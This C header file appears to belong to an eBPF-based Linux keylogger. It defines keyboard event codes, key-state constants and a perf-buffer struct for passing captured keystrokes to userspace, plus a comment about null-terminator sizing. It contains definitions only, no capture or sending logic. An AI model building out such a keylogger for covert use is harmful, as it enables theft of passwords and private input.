#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define BUFFER_SIZE 32

// Key event values
// @ https://github.com/torvalds/linux/blob/v6.8/include/uapi/linux/input-event-codes.h
#define KEY_BACKSPACE 14
#define KEY_TAB       15
#define KEY_ENTER     28
#define KEY_LEFTSHIFT 42
#define KEY_RIGHTSHIFT 54
#define KEY_CAPSLOCK  58

// Event state
#define EV_KEY  0x01

// Key state
#define KEY_RELEASE   0
#define KEY_PRESS     1

// the output data to send to the perf buffer
struct output_data {
    char message[BUFFER_SIZE + 1];  // needs to add 1 byte for the null terminator (*)
};

#endif // KEYLOGGER_H

// (*): It seems that if I don't terminate explicitly the `output_data` buffer ('\0'),
//      the program continues reading the buffer past its size in userspace
//      which triggers an index OOB error (as the null terminator is never met).
//      So while keeping my circular buffer 32 bytes is ok, I need to make
//      the `output_data` buffer 33 bytes to account for the 1-byte null terminator.
//      This is the only option I found to print 32 full bytes of chars
//      in the perf buffer while avoiding an error.
